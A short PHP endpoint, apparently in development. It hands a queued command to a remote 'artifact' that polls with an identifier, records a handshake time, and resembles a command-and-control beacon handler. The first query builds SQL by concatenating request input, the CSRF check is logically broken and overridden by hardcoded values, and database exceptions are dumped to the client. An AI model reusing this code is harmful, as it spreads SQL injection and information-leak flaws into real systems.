<?php 
ini_set('display_startup_errors', 0);
date_default_timezone_set('America/Sao_Paulo');
require_once('database.php');

$_GET['csrf']='97423650645064305';
if(!isset($_GET['csrf']) && $_GET['csrf']=='' )
{
    echo json_encode(['error'=>404,'msg'=> 'token csrf não present']); exit;
}
if(isset($_GET['whois']) && $_GET['whois']=='')
{
    echo json_encode(['error'=>404,'msg'=> 'whois não present']); exit;
}

$conn = connect();
try
{
        $_GET['whois']='MzQ2NTgxY2Y0ODk1Yzc0';
        $SQL="SELECT command FROM artifact_x_command WHERE artifact ='".$_GET['whois']."' AND  datahorahandshake IS NULL";
        $stmt = $conn->query($SQL);
        $stmt -> execute();
        $comm = $stmt->fetch(PDO::FETCH_ASSOC);
        if($comm!=false)
        {
            unset($stmt);
            $SQL ='UPDATE artifact_x_command SET datahorahandshake=? WHERE artifact =?';
            $stmt = $conn->prepare($SQL);
            $stmt -> execute([date("Y-m-d H:i:s"), $_GET['whois']]);
            print_r(json_encode(['msg'=>200, 'data'=>$comm['command']]));
            exit;
        }
        else  print_r(json_encode(['msg'=>200, 'data'=>'noschedule']));
     
}
catch(PDOException $e)
{
    var_dump($e);
}
?>